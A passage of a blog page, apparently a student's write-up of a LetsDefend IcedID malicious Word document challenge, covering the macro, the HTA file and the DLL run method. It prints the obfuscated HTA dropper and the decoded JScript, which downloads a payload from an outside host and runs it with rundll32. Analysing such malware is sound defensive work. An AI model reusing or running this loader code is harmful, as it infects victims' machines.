@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+  <meta name="generator" content="Hugo 0.92.2" />
+  <link rel="canonical" href="https://1d8.github.io/writeups/letsdefend/iceiddocanalysis/" />
+
+  
+    
+    <meta name="description" content="Description: Performing malware analysis on a malicious document from the IceID malware family Let’s Defend IcedID Malware Family - https://app.letsdefend.io/challenge/IcedID-Malware-Family/
+ What is the sha256 hash for the malspam attachment?  cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1
+This can be found by running sha256sum &lt;malspam document&gt; on Linux:
+What is the child process command line when the user enabled the Macro?  explorer.exe collectionBoxConst.hta
+Now that we have the malicious Word document, we can check it for macros using oleVBA to analyze the document.">
+  
+
+  <link rel="apple-touch-icon" sizes="180x180" href="https://1d8.github.io/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://1d8.github.io/favicon-32x32.png"> 
+  <link rel="icon" type="image/png" sizes="16x16" href="https://1d8.github.io/favicon-16x16.png"> 
+  <link rel="manifest" href="https://1d8.github.io/site.webmanifest"> 
+  <link rel="mask-icon" href="https://1d8.github.io/safari-pinned-tab.svg" color="#000000"> 
+  <meta name="msapplication-TileColor" content="#ffffff">
+  <meta name="theme-color" content="#ffffff">
+
+  <style>
+    body {
+      visibility: hidden;
+      opacity: 0;
+    }
+  </style>
+
+  <style id="darkTheme">
+    .intro-and-nav,
+    .main-and-footer {
+      filter: invert(100%);
+    }
+
+    * {
+      background-color: inherit
+    }
+
+    img:not([src*=".svg"]),
+    .colors,
+    iframe,
+    .demo-container {
+      filter: invert(100%);
+    }
+  </style>
+
+  <link rel="stylesheet" href="/css/prism.css" media="none" onload="this.media='all';">
+
+  
+  
+  <link rel="stylesheet" type="text/css" href="/css/styles.css">
+
+  
+
+  
+  
+  <title>IceID Malicious Doc Analysis | Blog</title>
+</head>
+
+  <body>
+    <a href="#main">skip to content</a>
+    <noscript>
+  <style>
+    body {
+      visibility: visible;
+      opacity: 1;
+    }
+  </style>
+</noscript>
+
+    <svg style="display: none">
+  <symbol id="bookmark" viewBox="0 0 40 50">
+   <g transform="translate(2266 3206.2)">
+    <path style="stroke:currentColor;stroke-width:3.2637;fill:none" d="m-2262.2-3203.4-.2331 42.195 16.319-16.318 16.318 16.318.2331-42.428z"/>
+   </g>
+  </symbol>
+
+  <symbol id="w3c" viewBox="0 0 127.09899 67.763">
+   <text font-size="83" style="font-size:83px;font-family:Trebuchet;letter-spacing:-12;fill-opacity:0" letter-spacing="-12" y="67.609352" x="-26.782778">W3C</text>
+   <text font-size="83" style="font-size:83px;font-weight:bold;font-family:Trebuchet;fill-opacity:0" y="67.609352" x="153.21722" font-weight="bold">SVG</text>
+   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m33.695.377 12.062 41.016 12.067-41.016h8.731l-19.968 67.386h-.831l-12.48-41.759-12.479 41.759h-.832l-19.965-67.386h8.736l12.061 41.016 8.154-27.618-3.993-13.397h8.737z"/>
+   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m91.355 46.132c0 6.104-1.624 11.234-4.862 15.394-3.248 4.158-7.45 6.237-12.607 6.237-3.882 0-7.263-1.238-10.148-3.702-2.885-2.47-5.02-5.812-6.406-10.022l6.82-2.829c1.001 2.552 2.317 4.562 3.953 6.028 1.636 1.469 3.56 2.207 5.781 2.207 2.329 0 4.3-1.306 5.909-3.911 1.609-2.606 2.411-5.738 2.411-9.401 0-4.049-.861-7.179-2.582-9.399-1.995-2.604-5.129-3.912-9.397-3.912h-3.327v-3.991l11.646-20.133h-14.062l-3.911 6.655h-2.493v-14.976h32.441v4.075l-12.31 21.217c4.324 1.385 7.596 3.911 9.815 7.571 2.22 3.659 3.329 7.953 3.329 12.892z"/>
+   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m125.21 0 1.414 8.6-5.008 9.583s-1.924-4.064-5.117-6.314c-2.693-1.899-4.447-2.309-7.186-1.746-3.527.73-7.516 4.938-9.258 10.13-2.084 6.21-2.104 9.218-2.178 11.978-.115 4.428.58 7.043.58 7.043s-3.04-5.626-3.011-13.866c.018-5.882.947-11.218 3.666-16.479 2.404-4.627 5.954-7.404 9.114-7.728 3.264-.343 5.848 1.229 7.841 2.938 2.089 1.788 4.213 5.698 4.213 5.698l4.94-9.837z"/>
+   <path style="fill:currentColor;image-rendering:optimizeQuality;shape-rendering:geometricPrecision" d="m125.82 48.674s-2.208 3.957-3.589 5.48c-1.379 1.524-3.849 4.209-6.896 5.555-3.049 1.343-4.646 1.598-7.661 1.306-3.01-.29-5.807-2.032-6.786-2.764-.979-.722-3.486-2.864-4.897-4.854-1.42-2-3.634-5.995-3.634-5.995s1.233 4.001 2.007 5.699c.442.977 1.81 3.965 3.749 6.572 1.805 2.425 5.315 6.604 10.652 7.545 5.336.945 9.002-1.449 9.907-2.031.907-.578 2.819-2.178 4.032-3.475 1.264-1.351 2.459-3.079 3.116-4.108.487-.758 1.276-2.286 1.276-2.286l-1.276-6.644z"/>
+  </symbol>
+
+  <symbol id="tag" viewBox="0 0 177.16535 177.16535">
+    <g transform="translate(0 -875.2)">
+     <path style="fill-rule:evenodd;stroke-width:0;fill:currentColor" d="m159.9 894.3-68.79 8.5872-75.42 77.336 61.931 60.397 75.429-76.565 6.8495-69.755zm-31.412 31.835a10.813 10.813 0 0 1 1.8443 2.247 10.813 10.813 0 0 1 -3.5174 14.872l-.0445.0275a10.813 10.813 0 0 1 -14.86 -3.5714 10.813 10.813 0 0 1 3.5563 -14.863 10.813 10.813 0 0 1 13.022 1.2884z"/>
+    </g>
+  </symbol>
+
+  <symbol id="balloon" viewBox="0 0 141.73228 177.16535">
+   <g transform="translate(0 -875.2)">
+    <g>
+     <path style="fill:currentColor" d="m68.156 882.83-.88753 1.4269c-4.9564 7.9666-6.3764 17.321-5.6731 37.378.36584 10.437 1.1246 23.51 1.6874 29.062.38895 3.8372 3.8278 32.454 4.6105 38.459 4.6694-.24176 9.2946.2879 14.377 1.481 1.2359-3.2937 5.2496-13.088 8.886-21.623 6.249-14.668 8.4128-21.264 10.253-31.252 1.2464-6.7626 1.6341-12.156 1.4204-19.764-.36325-12.93-2.1234-19.487-6.9377-25.843-2.0833-2.7507-6.9865-7.6112-7.9127-7.8436-.79716-.20019-6.6946-1.0922-6.7755-1.0248-.02213.0182-5.0006-.41858-7.5248-.22808l-2.149-.22808h-3.3738z"/>
+     <path style="fill:currentColor" d="m61.915 883.28-3.2484.4497c-1.7863.24724-3.5182.53481-3.8494.63994-2.4751.33811-4.7267.86957-6.7777 1.5696-.28598 0-1.0254.20146-2.3695.58589-5.0418 1.4418-6.6374 2.2604-8.2567 4.2364-6.281 7.6657-11.457 18.43-12.932 26.891-1.4667 8.4111.71353 22.583 5.0764 32.996 3.8064 9.0852 13.569 25.149 22.801 37.517 1.3741 1.841 2.1708 2.9286 2.4712 3.5792 3.5437-1.1699 6.8496-1.9336 10.082-2.3263-1.3569-5.7831-4.6968-21.86-6.8361-33.002-.92884-4.8368-2.4692-14.322-3.2452-19.991-.68557-5.0083-.77707-6.9534-.74159-15.791.04316-10.803.41822-16.162 1.5026-21.503 1.4593-5.9026 3.3494-11.077 6.3247-15.852z"/>
+     <path style="fill:currentColor" d="m94.499 885.78c-.10214-.0109-.13691 0-.0907.0409.16033.13489 1.329 1.0675 2.5976 2.0723 6.7003 5.307 11.273 14.568 12.658 25.638.52519 4.1949.24765 14.361-.5059 18.523-2.4775 13.684-9.7807 32.345-20.944 53.519l-3.0559 5.7971c2.8082.76579 5.7915 1.727 8.9926 2.8441 11.562-11.691 18.349-19.678 24.129-28.394 7.8992-11.913 11.132-20.234 12.24-31.518.98442-10.02-1.5579-20.876-6.7799-28.959-.2758-.4269-.57803-.86856-.89617-1.3166-3.247-6.13-9.752-12.053-21.264-16.131-2.3687-.86369-6.3657-2.0433-7.0802-2.1166z"/>
+     <path style="fill:currentColor" d="m32.52 892.22c-.20090-.13016-1.4606.81389-3.9132 2.7457-11.486 9.0476-17.632 24.186-16.078 39.61.79699 7.9138 2.4066 13.505 5.9184 20.562 5.8577 11.77 14.749 23.219 30.087 38.74.05838.059.12188.1244.18052.1838 1.3166-.5556 2.5965-1.0618 3.8429-1.5199-.66408-.32448-1.4608-1.3297-3.8116-4.4602-5.0951-6.785-8.7512-11.962-13.051-18.486-5.1379-7.7948-5.0097-7.5894-8.0586-13.054-6.2097-11.13-8.2674-17.725-8.6014-27.563-.21552-6.3494.13041-9.2733 1.775-14.987 2.1832-7.5849 3.9273-10.986 9.2693-18.07 1.7839-2.3656 2.6418-3.57 2.4409-3.7003z"/>
+     <path style="fill:currentColor" d="m69.133 992.37c-6.2405.0309-12.635.76718-19.554 2.5706 4.6956 4.7759 9.935 10.258 12.05 12.625l4.1272 4.6202h11.493l3.964-4.4516c2.0962-2.3541 7.4804-7.9845 12.201-12.768-8.378-1.4975-16.207-2.6353-24.281-2.5955z"/>
+     <rect style="stroke-width:0;fill:currentColor" ry="2.0328" height="27.746" width="22.766" y="1017.7" x="60.201"/>
+    </g>
+   </g>
+  </symbol>
+
+  <symbol id="info" viewBox="0 0 41.667 41.667">
+   <g transform="translate(-37.035 -1004.6)">
+    <path style="stroke-linejoin:round;stroke:currentColor;stroke-linecap:round;stroke-width:3.728;fill:none" d="m76.25 1030.2a18.968 18.968 0 0 1 -23.037 13.709 18.968 18.968 0 0 1 -13.738 -23.019 18.968 18.968 0 0 1 23.001 -13.768 18.968 18.968 0 0 1 13.798 22.984"/>
+    <g transform="matrix(1.1146 0 0 1.1146 -26.276 -124.92)">
+     <path style="stroke:currentColor;stroke-linecap:round;stroke-width:3.728;fill:none" d="m75.491 1039.5v-8.7472"/>
+     <path style="stroke-width:0;fill:currentColor" transform="scale(-1)" d="m-73.193-1024.5a2.3719 2.3719 0 0 1 -2.8807 1.7142 2.3719 2.3719 0 0 1 -1.718 -2.8785 2.3719 2.3719 0 0 1 2.8763 -1.7217 2.3719 2.3719 0 0 1 1.7254 2.8741"/>
+    </g>
+   </g>
+  </symbol>
+
+  <symbol id="warning" viewBox="0 0 48.430474 41.646302">
+    <g transform="translate(-1.1273 -1010.2)">
+     <path style="stroke-linejoin:round;stroke:currentColor;stroke-linecap:round;stroke-width:4.151;fill:none" d="m25.343 1012.3-22.14 37.496h44.28z"/>
+     <path style="stroke:currentColor;stroke-linecap:round;stroke-width:4.1512;fill:none" d="m25.54 1027.7v8.7472"/>
+     <path style="stroke-width:0;fill:currentColor" d="m27.839 1042.8a2.3719 2.3719 0 0 1 -2.8807 1.7143 2.3719 2.3719 0 0 1 -1.718 -2.8785 2.3719 2.3719 0 0 1 2.8763 -1.7217 2.3719 2.3719 0 0 1 1.7254 2.8741"/>
+    </g>
+  </symbol>
+
+  <symbol id="menu" viewBox="0 0 50 50">
+     <rect style="stroke-width:0;fill:currentColor" height="10" width="50" y="0" x="0"/>
+     <rect style="stroke-width:0;fill:currentColor" height="10" width="50" y="20" x="0"/>
+     <rect style="stroke-width:0;fill:currentColor" height="10" width="50" y="40" x="0"/>
+   </symbol>
+
+   <symbol id="link" viewBox="0 0 50 50">
+    <g transform="translate(0 -1002.4)">
+     <g transform="matrix(.095670 0 0 .095670 2.3233 1004.9)">
+      <g>
+       <path style="stroke-width:0;fill:currentColor" d="m452.84 192.9-128.65 128.65c-35.535 35.54-93.108 35.54-128.65 0l-42.881-42.886 42.881-42.876 42.884 42.876c11.845 11.822 31.064 11.846 42.886 0l128.64-128.64c11.816-11.831 11.816-31.066 0-42.9l-42.881-42.881c-11.822-11.814-31.064-11.814-42.887 0l-45.928 45.936c-21.292-12.531-45.491-17.905-69.449-16.291l72.501-72.526c35.535-35.521 93.136-35.521 128.64 0l42.886 42.881c35.535 35.523 35.535 93.141-.001 128.66zm-254.28 168.51-45.903 45.9c-11.845 11.846-31.064 11.817-42.881 0l-42.884-42.881c-11.845-11.821-11.845-31.041 0-42.886l128.65-128.65c11.819-11.814 31.069-11.814 42.884 0l42.886 42.886 42.876-42.886-42.876-42.881c-35.54-35.521-93.113-35.521-128.65 0l-128.65 128.64c-35.538 35.545-35.538 93.146 0 128.65l42.883 42.882c35.51 35.54 93.11 35.54 128.65 0l72.496-72.499c-23.956 1.597-48.092-3.784-69.474-16.283z"/>
+      </g>
+     </g>
+    </g>
+  </symbol>
+
+  <symbol id="doc" viewBox="0 0 35 45">
+   <g transform="translate(-147.53 -539.83)">
+    <path style="stroke:currentColor;stroke-width:2.4501;fill:none" d="m149.38 542.67v39.194h31.354v-39.194z"/>
+    <g style="stroke-width:25" transform="matrix(.098003 0 0 .098003 133.69 525.96)">
+     <path d="m220 252.36h200" style="stroke:currentColor;stroke-width:25;fill:none"/>
+     <path style="stroke:currentColor;stroke-width:25;fill:none" d="m220 409.95h200"/>
+     <path d="m220 488.74h200" style="stroke:currentColor;stroke-width:25;fill:none"/>
+     <path d="m220 331.15h200" style="stroke:currentColor;stroke-width:25;fill:none"/>
+    </g>
+   </g>
+ </symbol>
+
+ <symbol id="tick" viewBox="0 0 177.16535 177.16535">
+  <g transform="translate(0 -875.2)">
+   <rect style="stroke-width:0;fill:currentColor" transform="rotate(30)" height="155" width="40" y="702.99" x="556.82"/>
+   <rect style="stroke-width:0;fill:currentColor" transform="rotate(30)" height="40" width="90.404" y="817.99" x="506.42"/>
+  </g>
+ </symbol>
+</svg>
+
+    <div class="wrapper">
+      <header class="intro-and-nav" role="banner">
+  <div>
+    <div class="intro">
+      <a
+        class="logo"
+        href="https://1d8.github.io/"
+        aria-label="Blog home page"
+      >
+        
+          <img 
+            src="/images/logo.svg" 
+            alt="Logo No Loado"
+          >
+        
+      </a>
+      <p class="library-desc">
+         The blog of a cybersecurity collegiate 
+      </p>
+    </div>
+    <nav id="patterns-nav" class="patterns" role="navigation">
+  <h2 class="vh">Main navigation</h2>
+  <button id="menu-button" aria-expanded="false">
+    <svg viewBox="0 0 50 50" aria-hidden="true" focusable="false">
+      <use href="#menu"></use>
+    </svg>
+    Menu
+  </button>
+  
+  <ul id="patterns-list">
+  
+    <li class="pattern">
+      
+      
+      
+      
+      <a href="/cves/" >
+        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
+          <use href="#bookmark"></use>
+        </svg>
+        <span class="text">CVEs</span>
+      </a>
+    </li>
+  
+    <li class="pattern">
+      
+      
+      
+      
+      <a href="/" >
+        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
+          <use href="#bookmark"></use>
+        </svg>
+        <span class="text">Home</span>
+      </a>
+    </li>
+  
+    <li class="pattern">
+      
+      
+      
+      
+      <a href="/publications/" >
+        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
+          <use href="#bookmark"></use>
+        </svg>
+        <span class="text">Publications</span>
+      </a>
+    </li>
+  
+    <li class="pattern">
+      
+      
+      
+      
+      <a href="/writeups/" >
+        <svg class="bookmark-icon" aria-hidden="true" focusable="false" viewBox="0 0 40 50">
+          <use href="#bookmark"></use>
+        </svg>
+        <span class="text">Writeups/Walkthroughs</span>
+      </a>
+    </li>
+  
+  </ul>
+</nav>
+    
+  </div>
+</header>
+
+      <div class="main-and-footer">
+        <div>
+          
+  <main id="main">
+    <h1>IceID Malicious Doc Analysis</h1>
+    <p><strong>Description: Performing malware analysis on a malicious document from the IceID malware family</strong>
+Let&rsquo;s Defend IcedID Malware Family - <a href="https://app.letsdefend.io/challenge/IcedID-Malware-Family/">https://app.letsdefend.io/challenge/IcedID-Malware-Family/</a></p>
+<ol>
+<li>What is the sha256 hash for the malspam attachment?</li>
+</ol>
+<p><code>cc721111b5924cfeb91440ecaccc60ecc30d10fffbdab262f7c0a17027f527d1</code></p>
+<p>This can be found by running <code>sha256sum &lt;malspam document&gt;</code> on Linux:</p>
+<ol start="2">
+<li>What is the child process command line when the user enabled the Macro?</li>
+</ol>
+<p><code>explorer.exe collectionBoxConst.hta</code></p>
+<p>Now that we have the malicious Word document, we can check it for macros using <a href="https://github.com/decalage2/oletools/wiki/olevba">oleVBA</a> to analyze the document. I am using Remnux&rsquo;s VM which comes with <em>oleVBA</em> preinstalled, so I simply have to run:</p>
+<p><code>olevba doc.doc</code>:</p>
+<p>which outputs:</p>
+<p><img src="https://i.imgur.com/XbBugon.png" alt=""></p>
+<p><code>Sub autoopen()</code> is a function named <code>AutoOpen()</code>, and it&rsquo;ll be executed as soon as the victim enables macros on the malicious document.</p>
+<p>So when the victim enables macros, <code>Shell</code> will execute <code>explorer.exe collectionBoxConst.hta</code> which opens the <code>.hta</code> file. We have the <code>.hta</code> file referenced here and will analyze it further in the next tasks.</p>
+<ol start="3">
+<li>What is the HTML Application file&rsquo;s sha256 hash from previous question?</li>
+</ol>
+<p><code>8062bf9248451706c9c2007e1772e51268f299d5253cbd9ef327dd829c51755b</code></p>
+<p>This can be found by running <code>sha256sum &lt;HTML Application Filename&gt;.hta</code></p>
+<ol start="4">
+<li>Based on the previous question, what is the DLL run method?</li>
+</ol>
+<p><code>&quot;C:\Windows\System32\rundll32.exe&quot; c:\users\public\collectionBoxConst.jpg,PluginInit</code></p>
+<p>Now we&rsquo;re asked to give the DLL run method, so we know there&rsquo;s a DLL file associated with the <code>collectionBoxConst.hta</code> file somehow.</p>
+<p>The content of the <code>collectionBoxConst.hta</code> file is:</p>
+<p><img src="https://i.imgur.com/KYyvfmI.png" alt=""></p>
+<p>And here is a text representation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">html&gt;
+body&gt;
+div id=&#39;copyCurrencyMemory&#39;&gt;fX17KWUoaGN0YWN9O2Vzb2xjLnRzTHJhdjspMiAsImdwai50c25vQ3hvQm5vaXRjZWxsb2NcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLnRzTHJhdjspeWRvYmVzbm9wc2VyLlJyZWdldG5JZXRhZChldGlydy50c0xyYXY7MSA9IGVweXQudHNMcmF2O25lcG8udHNMcmF2OykibWFlcnRzLmJkb2RhIih0Y2VqYk9YZXZpdGNBIHdlbiA9IHRzTHJhdiByYXZ7eXJ0eykwMDIgPT0gc3V0YXRzLlJyZWdldG5JZXRhZChmaTspKGRuZXMuUnJlZ2V0bklldGFkOyllc2xhZiAsIkNYTWpPb0dUNDJDV2JNNzZzMWN3RD1xJjA5TWtubFF2WkdCQUYyRGRGUlZ5TDEyZ2dWWnU9aGNyYWVzJlQyOTJEb01IbT1yZXN1JmZwNHJWPWRpJnllRFBPWGREUDZJNGhXeDlqaD1xJm5mVWcwczladENhVnk9dUp3Uzl5OWkmSmk4bjJLMT1lZ2FwJm5GdmVJckh5NUZMWjExWFV5RDRnY2JvcTA9ZW1pdCZ2YmZrSXNSbmE9cmVzdT81ZXNvcy9OUElyR2drUDZSQUFIVlZLQ2NlUngwVlZCNlR1dEx6emlOUUovN1lXeGlRQWtPbk9CeDUvVC9hZGRhL21vYy56ZXJ1bGNjbWVzcnVvYy8vOnB0dGgiICwiVEVHIihuZXBvLlJyZWdldG5JZXRhZDspInB0dGhsbXguMmxteHNtIih0Y2VqYk9YZXZpdGNBIHdlbiA9IFJyZWdldG5JZXRhZCByYXY=aGVsbG8fXspdHhlTnhlZG5JeGVkbmkoaGN0YWN9Oyl0Y2VqYk9Wb3BlcihlbGlmZXRlbGVkLnRjdXJ0U0xzZXR5YjsiYXRoLnRzbm9DeG9Cbm9pdGNlbGxvY1xcIiArIHlyb3RjZXJpRHRuZXJydUMudHNub0NlY25lcmVmZVJ0c3VydCA9IHRjZWpiT1ZvcGVye3lydDspInRpbkluaWd1bFAsZ3BqLnRzbm9DeG9Cbm9pdGNlbGxvY1xcY2lsYnVwXFxzcmVzdVxcOmMgMjNsbGRudXIiKG51ci50c25vQ2VjbmVyZWZlUnRzdXJ0OykidGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gdGN1cnRTTHNldHliIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gdHNub0NlY25lcmVmZVJ0c3VydCByYXY=aGVsbG8msscriptcontrol.scriptcontrol&lt;/<span style="color:#f92672">div</span>&gt;&lt;<span style="color:#f92672">div</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;vConstBorder&#39;</span>&gt;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&lt;/<span style="color:#f92672">div</span>&gt;
+
+script language=&#39;javascript&#39;&gt;
+function WLongPtr(altListVba){return(new ActiveXObject(altListVba));}function objButtBool(headerListbox){return(removeConstFunction.getElementById(headerListbox).innerHTML);}function boolOptionClass(){return(objButtBool(&#39;vConstBorder&#39;));}function sinBooleanCur(s){var e={}; var i; var b=0; var c; var x; var l=0; var a; var memSetByte=&#39;&#39;; var w=String.fromCharCode; var L=s.length;var intBorder = zeroI(&#39;tArahc&#39;);for(i=0;i&lt;<span style="color:#f92672">64</span><span style="color:#960050;background-color:#1e0010">;</span><span style="color:#a6e22e">i</span><span style="color:#960050;background-color:#1e0010">++){</span><span style="color:#a6e22e">e</span><span style="color:#960050;background-color:#1e0010">[</span><span style="color:#a6e22e">boolOptionClass</span><span style="color:#960050;background-color:#1e0010">()[</span><span style="color:#a6e22e">intBorder</span><span style="color:#960050;background-color:#1e0010">](</span><span style="color:#a6e22e">i</span><span style="color:#960050;background-color:#1e0010">)]=</span><span style="color:#a6e22e">i</span><span style="color:#960050;background-color:#1e0010">;}</span><span style="color:#a6e22e">for</span><span style="color:#960050;background-color:#1e0010">(</span><span style="color:#a6e22e">x</span><span style="color:#f92672">=</span><span style="color:#e6db74">0;x&lt;L;x++){c=e[s[intBorder](x)];b=(b&lt;&lt;6)+c;l+=6;while(l</span>&gt;=8){((a=(b&gt;&gt;&gt;(l-=8))&amp;0xff)||(x&lt;(L-2)))&amp;&amp;(memSetByte+=w(a));}}return(memSetByte);};function zeroI(genTempTextbox){return genTempTextbox.split(&#39;&#39;).reverse().join(&#39;&#39;);}procDocumentI = window;removeConstFunction = document;procDocumentI.resizeTo(1, 1);procDocumentI.moveTo(-100, -100);var genericBoolean = removeConstFunction.getElementById(&#39;copyCurrencyMemory&#39;).innerHTML.split(&#34;aGVsbG8&#34;);var collectRightSingle = zeroI(sinBooleanCur(genericBoolean[0]));var vData = zeroI(sinBooleanCur(genericBoolean[1]));var viewPointerConvert = genericBoolean[2];
+/script&gt;
+
+script language=&#39;vbscript&#39;&gt;Function classResponseLocal(copyCurrencyMemory) : Set snglSngTpl = CreateObject(viewPointerConvert) : With snglSngTpl : .language = &#34;jscript&#34; : .timeout = 60000 : .eval(copyCurrencyMemory) : End With : End Function
+
+/script&gt;
+script language=&#39;vbscript&#39;&gt;Call classResponseLocal(collectRightSingle)
+/script&gt;
+
+script language=&#39;vbscript&#39;&gt;Call classResponseLocal(vData)<span style="color:#960050;background-color:#1e0010">&lt;</span>/script script language=&#39;javascript&#39;&gt;procDocumentI[&#39;close&#39;]();
+/script&gt;
+/body&gt;
+/html&gt;
+</code></pre></div><p>We can see that there&rsquo;s a large base64 string, but if we try to decode it all at once, we get gibberish mixed with garbage data:</p>
+<p><img src="https://i.imgur.com/c1LgzZZ.png" alt=""></p>
+<p>But if we look deeper at the Javascript of the HTML, we can determine that the base64 encoded data is being split by <code>aGVsbG8</code>, which means this is meant to separate 2 base64 encoded data chunks.</p>
+<ul>
+<li>If we decode <code>aGVsbG8</code>, it is <em>hello</em> (:</li>
+</ul>
+<p>So if we don&rsquo;t include the <code>aGVsbG8</code> string and instead split the base64 chunks on this string, we end up with these 2 chunks:</p>
+<ol>
+<li><code>fX17KWUoaGN0YWN9O2Vzb2xjLnRzTHJhdjspMiAsImdwai50c25vQ3hvQm5vaXRjZWxsb2NcXGNpbGJ1cFxcc3Jlc3VcXDpjIihlbGlmb3RldmFzLnRzTHJhdjspeWRvYmVzbm9wc2VyLlJyZWdldG5JZXRhZChldGlydy50c0xyYXY7MSA9IGVweXQudHNMcmF2O25lcG8udHNMcmF2OykibWFlcnRzLmJkb2RhIih0Y2VqYk9YZXZpdGNBIHdlbiA9IHRzTHJhdiByYXZ7eXJ0eykwMDIgPT0gc3V0YXRzLlJyZWdldG5JZXRhZChmaTspKGRuZXMuUnJlZ2V0bklldGFkOyllc2xhZiAsIkNYTWpPb0dUNDJDV2JNNzZzMWN3RD1xJjA5TWtubFF2WkdCQUYyRGRGUlZ5TDEyZ2dWWnU9aGNyYWVzJlQyOTJEb01IbT1yZXN1JmZwNHJWPWRpJnllRFBPWGREUDZJNGhXeDlqaD1xJm5mVWcwczladENhVnk9dUp3Uzl5OWkmSmk4bjJLMT1lZ2FwJm5GdmVJckh5NUZMWjExWFV5RDRnY2JvcTA9ZW1pdCZ2YmZrSXNSbmE9cmVzdT81ZXNvcy9OUElyR2drUDZSQUFIVlZLQ2NlUngwVlZCNlR1dEx6emlOUUovN1lXeGlRQWtPbk9CeDUvVC9hZGRhL21vYy56ZXJ1bGNjbWVzcnVvYy8vOnB0dGgiICwiVEVHIihuZXBvLlJyZWdldG5JZXRhZDspInB0dGhsbXguMmxteHNtIih0Y2VqYk9YZXZpdGNBIHdlbiA9IFJyZWdldG5JZXRhZCByYXY=</code></li>
+<li><code>fXspdHhlTnhlZG5JeGVkbmkoaGN0YWN9Oyl0Y2VqYk9Wb3BlcihlbGlmZXRlbGVkLnRjdXJ0U0xzZXR5YjsiYXRoLnRzbm9DeG9Cbm9pdGNlbGxvY1xcIiArIHlyb3RjZXJpRHRuZXJydUMudHNub0NlY25lcmVmZVJ0c3VydCA9IHRjZWpiT1ZvcGVye3lydDspInRpbkluaWd1bFAsZ3BqLnRzbm9DeG9Cbm9pdGNlbGxvY1xcY2lsYnVwXFxzcmVzdVxcOmMgMjNsbGRudXIiKG51ci50c25vQ2VjbmVyZWZlUnRzdXJ0OykidGNlamJvbWV0c3lzZWxpZi5nbml0cGlyY3MiKHRjZWpiT1hldml0Y0Egd2VuID0gdGN1cnRTTHNldHliIHJhdjspImxsZWhzLnRwaXJjc3ciKHRjZWpiT1hldml0Y0Egd2VuID0gdHNub0NlY25lcmVmZVJ0c3VydCByYXY=</code></li>
+</ol>
+<p>And if we decode both, we end up with:</p>
+<ol>
+<li><code>}}{)e(hctac};esolc.tsLrav;)2 ,&quot;gpj.tsnoCxoBnoitcelloc\\cilbup\\sresu\\:c&quot;(elifotevas.tsLrav;)ydobesnopser.RregetnIetad(etirw.tsLrav;1 = epyt.tsLrav;nepo.tsLrav;)&quot;maerts.bdoda&quot;(tcejbOXevitcA wen = tsLrav rav{yrt{)002 == sutats.RregetnIetad(fi;)(dnes.RregetnIetad;)eslaf ,&quot;CXMjOoGT42CWbM76s1cwD=q&amp;09MknlQvZGBAF2DdFRVyL12ggVZu=hcraes&amp;T292DoMHm=resu&amp;fp4rV=di&amp;yeDPOXdDP6I4hWx9jh=q&amp;nfUg0s9ZtCaVy=uJwS9y9i&amp;Ji8n2K1=egap&amp;nFveIrHy5FLZ11XUyD4gcboq0=emit&amp;vbfkIsRna=resu?5esos/NPIrGgkP6RAAHVVKCceRx0VVB6TutLzziNQJ/7YWxiQAkOnOBx5/T/adda/moc.zerulccmesruoc//:ptth&quot; ,&quot;TEG&quot;(nepo.RregetnIetad;)&quot;ptthlmx.2lmxsm&quot;(tcejbOXevitcA wen = RregetnIetad</code></li>
+<li><code>}{)txeNxednIxedni(hctac};)tcejbOVoper(elifeteled.tcurtSLsetyb;&quot;ath.tsnoCxoBnoitcelloc\\&quot; + yrotceriDtnerruC.tsnoCecnerefeRtsurt = tcejbOVoper{yrt;)&quot;tinInigulP,gpj.tsnoCxoBnoitcelloc\\cilbup\\sresu\\:c 23lldnur&quot;(nur.tsnoCecnerefeRtsurt;)&quot;tcejbometsyselif.gnitpircs&quot;(tcejbOXevitcA wen = tcurtSLsetyb rav;)&quot;llehs.tpircsw&quot;(tcejbOXevitcA wen = tsnoCecnerefeRtsurt rav</code></li>
+</ol>
+<p>More seemingly garbage data, but if you look closely, you&rsquo;ll notice that there appears to be a file path in both strings. And if you read through the Javascript within the <code>.hta</code> file, you&rsquo;ll also notice that in addition to splitting the data on <code>aGVsbG8</code>, it also reverses the data chunks, so it&rsquo;s simply backwards.</p>
+<p>We can replicate this in Python by running:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3">print(garbageString[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])
+</code></pre></div><p>where <code>garbageString</code> is our backwards data. This will result in:</p>
